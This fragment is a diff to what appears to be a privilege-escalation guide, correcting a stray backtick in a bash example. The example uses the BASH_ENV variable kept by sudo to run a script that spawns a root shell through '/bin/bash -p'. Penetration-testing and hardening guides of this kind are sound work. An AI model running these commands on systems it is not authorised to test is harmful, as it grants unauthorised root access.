@@ -56,7 +56,7 @@ then `sudo` will preserve this variable, allowing privilege escalation if you ca
 ```bash
 echo '/bin/bash -p' > /tmp/root.sh
 chmod +x /tmp/root.sh
-sudo BASH_ENV=/tmp/root.sh /usr/bin/systeminfo`
+sudo BASH_ENV=/tmp/root.sh /usr/bin/systeminfo
 ```
 
 Here, `/usr/bin/systeminfo` is a root-allowed bash script.  
